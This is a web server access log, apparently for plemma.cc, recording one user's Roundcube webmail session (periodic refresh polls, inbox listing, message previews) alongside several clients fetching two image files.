73.107.144.246 - - [08/Sep/2021:15:51:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:52:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:53:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:54:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:55:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 641 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:56:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:57:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:58:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:15:59:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
51.6.142.68 - - [08/Sep/2021:16:00:53 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
51.6.142.68 - - [08/Sep/2021:16:00:53 +0000] "GET /usedjolie.png HTTP/1.1" 200 373195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
73.107.144.246 - - [08/Sep/2021:16:00:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 641 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:01:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:02:53 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
51.6.142.68 - - [08/Sep/2021:16:03:39 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
51.6.142.68 - - [08/Sep/2021:16:03:39 +0000] "GET /usedjolie.png HTTP/1.1" 200 373195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
73.107.144.246 - - [08/Sep/2021:16:03:43 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:04:44 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:05:43 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 641 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
162.195.96.17 - - [08/Sep/2021:16:06:19 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko)"
162.195.96.17 - - [08/Sep/2021:16:06:19 +0000] "GET /usedjolie.png HTTP/1.1" 200 373195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko)"
73.107.144.246 - - [08/Sep/2021:16:06:43 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:07:44 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
20.187.63.198 - - [08/Sep/2021:16:08:02 +0000] "GET / HTTP/1.1" 200 58244 "-" "-"
73.107.144.246 - - [08/Sep/2021:16:08:43 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:09:43 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
66.249.81.14 - - [08/Sep/2021:16:10:25 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)"
66.249.81.12 - - [08/Sep/2021:16:10:24 +0000] "GET /usedjolie.png HTTP/1.1" 200 373195 "-" "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)"
73.107.144.246 - - [08/Sep/2021:16:10:44 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 641 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
74.125.210.76 - - [08/Sep/2021:16:11:05 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)"
73.107.144.246 - - [08/Sep/2021:16:11:43 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 553 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:12 +0000] "POST /roundcube/?_task=mail&_unlock=loading1631117531581&_framed=1 HTTP/1.1" 200 910 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:15 +0000] "GET /roundcube/?_task=mail&_refresh=1&_mbox=INBOX HTTP/1.1" 200 9208 "http://www.plemma.cc/roundcube/?_task=mail&_action=compose&_id=5038258026138c7e547851" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:16 +0000] "GET /roundcube/program/js/treelist.js?s=1630931984 HTTP/1.1" 200 9456 "http://www.plemma.cc/roundcube/?_task=mail&_refresh=1&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:16 +0000] "GET /roundcube/skins/larry/watermark.html HTTP/1.1" 200 543 "http://www.plemma.cc/roundcube/?_task=mail&_refresh=1&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:17 +0000] "GET /roundcube/skins/larry/watermark.html HTTP/1.1" 200 544 "http://www.plemma.cc/roundcube/?_task=mail&_refresh=1&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:17 +0000] "GET /roundcube/?_task=mail&_action=list&_refresh=1&_layout=widescreen&_mbox=INBOX&_page=&_remote=1&_unlock=loading1631117536098&_=1631117535436 HTTP/1.1" 200 4133 "http://www.plemma.cc/roundcube/?_task=mail&_refresh=1&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:17 +0000] "GET /roundcube/?_task=mail&_action=getunread&_page=1&_remote=1&_unlock=0&_=1631117535437 HTTP/1.1" 200 628 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:17 +0000] "GET /roundcube/skins/larry/images/watermark.jpg?v=e784.5000 HTTP/1.1" 200 4810 "http://www.plemma.cc/roundcube/skins/larry/watermark.html" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:21 +0000] "GET /roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=832&_mbox=INBOX&_framed=1&_action=preview HTTP/1.1" 200 5944 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:21 +0000] "GET /roundcube/?_task=addressbook&_action=photo&_email=adamtwo%40gmail.com HTTP/1.1" 200 456 "http://www.plemma.cc/roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=832&_mbox=INBOX&_framed=1&_action=preview" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:22 +0000] "GET /roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=833&_mbox=INBOX&_framed=1&_action=preview HTTP/1.1" 200 5944 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:23 +0000] "GET /roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=834&_mbox=INBOX&_framed=1&_action=preview HTTP/1.1" 200 5950 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:27 +0000] "GET /roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=831&_mbox=INBOX&_framed=1&_action=preview HTTP/1.1" 200 37663 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:27 +0000] "GET /roundcube/?_task=addressbook&_action=photo&_email=thedefiant%40substack.com HTTP/1.1" 200 456 "http://www.plemma.cc/roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=831&_mbox=INBOX&_framed=1&_action=preview" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:12:36 +0000] "GET /roundcube/?_task=mail&_framed=1&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=831&_mbox=INBOX&_safe=1&_action=preview HTTP/1.1" 200 38829 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:13:18 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 703 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:14:18 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:15:17 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 770 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:16:18 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:17:18 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:18:17 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:19:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:20:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 4028 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:21:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 3919 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:22:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 696 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:23:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:24:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:25:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 769 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:26:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:27:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:28:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:29:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:30:56 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 769 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:31:17 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
85.18.240.254 - - [08/Sep/2021:16:31:33 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko)"
85.18.240.254 - - [08/Sep/2021:16:31:33 +0000] "GET /usedjolie.png HTTP/1.1" 200 373195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko)"
73.107.144.246 - - [08/Sep/2021:16:32:18 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:33:18 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:34:17 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:35:17 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 769 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:36:17 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 3939 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:37:19 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 688 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:38:20 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 3937 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:39:22 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 687 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:40:23 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 770 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:41:23 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:42:24 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:43:26 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:16:44:26 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:33 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX HTTP/1.1" 200 2708 "http://www.plemma.cc/roundcube/?_task=mail&_refresh=1&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/plugins/jqueryui/themes/larry/jquery-ui.css?s=1630931984 HTTP/1.1" 200 9804 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
